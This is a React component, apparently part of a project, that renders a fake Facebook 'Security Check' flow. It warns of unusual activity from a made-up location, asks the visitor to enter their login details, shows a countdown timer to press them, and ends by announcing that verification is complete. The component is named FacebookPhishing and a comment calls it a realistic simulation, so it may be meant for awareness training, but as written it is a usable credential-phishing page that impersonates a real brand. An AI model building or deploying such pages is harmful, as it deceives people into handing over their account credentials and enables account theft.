import React, { useState, useEffect } from 'react';
import Header from '@/components/facebook/Header';
import Footer from '@/components/facebook/Footer';
import SecurityAlert from '@/components/facebook/SecurityAlert';
import IdentityForm from '@/components/facebook/IdentityForm';
import ConfirmationMessage from '@/components/facebook/ConfirmationMessage';
import ForgotPassword from '@/components/facebook/ForgotPassword';
import Timer from '@/components/facebook/Timer';
import { detectBrowserInfo } from '@/lib/utils';
import { AlertInfo } from '@/lib/types';

const FacebookPhishing: React.FC = () => {
  // Main steps:
  // 1 - Security Alert
  // 2 - Identity Form (Login)
  // 3 - Confirmation Message
  // Additional states:
  // 'forgot-password' - Forgot Password Form
  const [currentStep, setCurrentStep] = useState<number | string>(1);
  const [alertInfo, setAlertInfo] = useState<AlertInfo>({
    location: 'Istanbul, Turkey',
    device: 'iPhone 14 – Safari',
    time: '5 minutes ago'
  });

  useEffect(() => {
    // Detect browser info for more realistic simulation
    const browserInfo = detectBrowserInfo();
    setAlertInfo(browserInfo);
    
    // Set the title to match Facebook's
    document.title = "Facebook – Security Check";
  }, []);

  const handleSecureAccount = () => {
    setCurrentStep(2);
  };

  const handleVerifyAccount = () => {
    setCurrentStep(3); // Go directly to confirmation
  };

  const handleForgotPassword = () => {
    setCurrentStep('forgot-password');
  };

  const handleReturnToLogin = () => {
    setCurrentStep(2);
  };

  const handleContactSupport = () => {
    // This would typically navigate to a support page or show a modal
    window.location.href = "https://www.facebook.com/help/";
  };

  return (
    <div className="min-h-screen flex flex-col bg-[#F0F2F5] font-['Helvetica Neue', Arial, sans-serif]">
      <Header />
      
      <main className="w-full max-w-md mx-auto py-8 px-4 flex-grow flex flex-col items-center justify-center">
        {currentStep === 1 && (
          <>
            <div className="mb-4 text-center">
              <h1 className="text-[#1C1E21] text-xl md:text-2xl font-bold">
                Security Check
              </h1>
              <p className="text-[#65676B] text-sm mt-1">
                We've detected unusual activity on your Facebook account
              </p>
            </div>
            <SecurityAlert 
              alertInfo={alertInfo} 
              onSecureAccount={handleSecureAccount} 
            />
          </>
        )}
        
        {currentStep === 2 && (
          <>
            <div className="mb-4 text-center">
              <h1 className="text-[#1C1E21] text-xl md:text-2xl font-bold">
                Confirm Your Identity
              </h1>
              <p className="text-[#65676B] text-sm mt-1">
                Please enter your login information to verify your account
              </p>
            </div>
            <IdentityForm 
              onVerifyAccount={handleVerifyAccount}
              onForgotPassword={handleForgotPassword}
            />
          </>
        )}
        
        {currentStep === 'forgot-password' && (
          <>
            <div className="mb-4 text-center">
              <h1 className="text-[#1C1E21] text-xl md:text-2xl font-bold">
                Find Your Account
              </h1>
              <p className="text-[#65676B] text-sm mt-1">
                Reset your password to regain access
              </p>
            </div>
            <ForgotPassword 
              onBack={handleReturnToLogin}
              onSubmit={handleReturnToLogin}
            />
          </>
        )}
        
        {currentStep === 3 && (
          <>
            <div className="mb-4 text-center">
              <h1 className="text-[#1C1E21] text-xl md:text-2xl font-bold">
                Security Verification Complete
              </h1>
              <p className="text-[#65676B] text-sm mt-1">
                Thank you for verifying your account
              </p>
            </div>
            <ConfirmationMessage 
              onContactSupport={handleContactSupport} 
            />
          </>
        )}
        
        {currentStep !== 3 && <Timer />}
      </main>
      
      <Footer />
    </div>
  );
};

export default FacebookPhishing;
